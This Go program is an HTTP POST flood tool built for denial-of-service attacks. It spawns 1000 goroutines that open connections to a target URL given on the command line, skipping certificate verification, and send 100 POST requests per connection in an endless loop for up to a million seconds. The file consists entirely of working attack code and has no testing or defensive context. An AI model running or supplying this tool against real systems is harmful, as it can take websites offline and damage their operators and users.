package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host    = ""
	port    = "80"
	page    = ""
	mode    = "post"
	start   = make(chan bool)
	threads = 1000
	limit   = 1000000
	data    = "f"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func flood() {
	addr := host + ":" + port
	header := "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
	header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
	header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"

	var s net.Conn
	var err error
	<-start
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host,
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!")
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
	}
}

func main() {
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	port = u.Port()
	page = u.Path

	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood()
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
	}
	fmt.Println("\n")
	fmt.Println("Flood will end in 1000000 seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
}
